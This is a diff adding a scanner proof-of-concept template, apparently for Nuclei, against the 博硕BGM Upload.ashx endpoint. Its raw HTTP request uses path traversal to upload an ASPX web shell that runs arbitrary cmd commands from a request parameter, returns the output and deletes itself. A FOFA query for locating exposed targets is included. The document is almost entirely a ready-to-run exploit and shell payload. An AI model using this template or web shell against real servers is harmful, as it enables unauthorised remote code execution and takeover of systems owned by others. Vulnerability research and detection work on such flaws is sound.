@@ -1,0 +1,106 @@
+id: poc-glq32npec62c1hu5
+info:
+  name: 博硕BGM Upload.ashx 存在文件上传致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/glq32npec62c1hu5'
+  tags: rce,file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: glq32npec62c1hu5
+    fofa: body="Libs/Platform.lib"
+http:
+- raw:
+  - 'POST /WebUpload/server/Upload.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1234567890
+
+    Connection: close
+
+
+    ------WebKitFormBoundary1234567890
+
+    Content-Disposition: form-data; name="id"
+
+
+    WU_FILE_0
+
+    ------WebKitFormBoundary1234567890
+
+    Content-Disposition: form-data; name="name"
+
+
+    1.aspx
+
+    ------WebKitFormBoundary1234567890
+
+    Content-Disposition: form-data; name="size"
+
+
+    10000
+
+    ------WebKitFormBoundary1234567890
+
+    Content-Disposition: form-data; name="type"
+
+
+    image/jpeg
+
+    ------WebKitFormBoundary1234567890
+
+    Content-Disposition: form-data; name="OwnBaseFolder"
+
+
+    ..
+
+    ------WebKitFormBoundary1234567890
+
+    Content-Disposition: form-data; name="file"; filename="1.jpg"
+
+    Content-Type: image/jpeg
+
+
+    <%@ Page Language="Jscript" validateRequest="false" %>
+
+    <%
+
+    var c=new System.Diagnostics.ProcessStartInfo("cmd");
+
+    var e=new System.Diagnostics.Process();
+
+    var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+
+    c.UseShellExecute=false;
+
+    c.RedirectStandardOutput=true;
+
+    c.RedirectStandardError=true;
+
+    e.StartInfo=c;
+
+    c.Arguments="/c " + Request.Item["cmd"];
+
+    e.Start();
+
+    out=e.StandardOutput;
+
+    EI=e.StandardError;
+
+    e.Close();
+
+    Response.Write(out.ReadToEnd() + EI.ReadToEnd());
+
+    System.IO.File.Delete(Request.PhysicalPath);
+
+    Response.End();%>
+
+    ------WebKitFormBoundary1234567890--![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1770564643695-90f4e4a1-c9a5-426d-b455-67c92175ff43.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
